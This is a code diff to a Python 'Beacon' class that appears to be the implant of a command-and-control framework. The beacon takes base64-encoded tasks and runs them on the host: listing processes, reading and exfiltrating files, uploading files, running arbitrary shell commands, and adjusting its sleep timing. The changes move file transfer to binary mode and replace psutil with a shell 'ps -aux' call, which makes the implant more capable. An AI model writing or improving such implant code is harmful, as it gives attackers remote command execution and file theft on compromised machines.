@@ -5,7 +5,7 @@ import socket
 import os 
 import platform
 import subprocess
-import psutil
+# import psutil
 from pathlib import Path
 
 
@@ -65,7 +65,7 @@ class Beacon:
             instruction = it["instruction"]
             args = it["args"]
             cmd = it["cmd"]
-            data = base64.b64decode(it["data"].encode('unicode_escape')).decode('unicode_escape')
+            data = base64.b64decode(it["data"].encode('utf-8'))
             inputFile = base64.b64decode(it["inputFile"].encode('utf-8')).decode('utf-8')
             outputFile = base64.b64decode(it["outputFile"].encode('utf-8')).decode('utf-8')
             pid = it["pid"]
@@ -92,19 +92,20 @@ class Beacon:
                     result = "No such file or directory: " + cmd
 
             elif instruction == "ps":
-                try:
-                    # print( list(psutil.Process().as_dict().keys()))
-                    for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
-                        cmdLine = ""
-                        for cmd in proc.info["cmdline"]:
-                            cmdLine += cmd + " "
-                        if cmdLine.strip() == "":  
-                            cmdLine = proc.info["name"]
+                result = subprocess.run(["ps -aux"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                # try:
+                #     # print( list(psutil.Process().as_dict().keys()))
+                #     for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
+                #         cmdLine = ""
+                #         for cmd in proc.info["cmdline"]:
+                #             cmdLine += cmd + " "
+                #         if cmdLine.strip() == "":  
+                #             cmdLine = proc.info["name"]
 
-                        result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
-                        result += "\n"
-                except:
-                    result = "ps failed"
+                #         result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
+                #         result += "\n"
+                # except:
+                #     result = "ps failed"
 
             elif instruction == "cd":
                 os.chdir(cmd)
@@ -115,23 +116,26 @@ class Beacon:
 
             elif instruction == "cat":
                 if os.path.isfile(inputFile):
-                    f = open(inputFile, "r")
+                    f = open(inputFile, "rb")
                     data = f.read()
                     f.close()
-                    result = data
+                    result = data.decode('utf-8')
 
             elif instruction == "download":
                 if os.path.isfile(inputFile):
-                    f = open(inputFile, "r")
-                    data = f.read()
-                    f.close()
-                    result = "File downloaded"
+                    try:
+                        f = open(inputFile, "rb")
+                        data = f.read()
+                        f.close()
+                        result = "File downloaded"
+                    except:
+                        result = "Download failed"
                 else:
                     result = "Download failed"
 
             elif instruction == "upload": 
                 try:
-                    f = open(outputFile, "w")
+                    f = open(outputFile, "wb")
                     f.write(data)
                     f.close()
                     result = "File uploaded."
@@ -141,7 +145,7 @@ class Beacon:
             elif instruction == "run":
                 result = subprocess.run([cmd], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
                 if not result:
-                    result="empty response"
+                    result="Empty response."
 
             elif instruction == "sleep":
                 self.sleepTimeMs=int(cmd)*1000
@@ -155,12 +159,12 @@ class Beacon:
             taskResult = {
                 "args":args,
                 "cmd":cmd,
-                "data":base64.b64encode(data.encode('unicode_escape')).decode('unicode_escape'),
+                "data":base64.b64encode(data).decode('utf-8'),
                 "inputFile":base64.b64encode(inputFile.encode('utf-8')).decode('utf-8'),
                 "instruction":instruction,
                 "outputFile":base64.b64encode(outputFile.encode('utf-8')).decode('utf-8'),
                 "pid":pid,
-                "returnValue":base64.b64encode(result.encode('unicode_escape')).decode('unicode_escape')
+                "returnValue":base64.b64encode(result.encode('utf-8')).decode('utf-8')
                 }
             self.taskResults.append(taskResult)
 
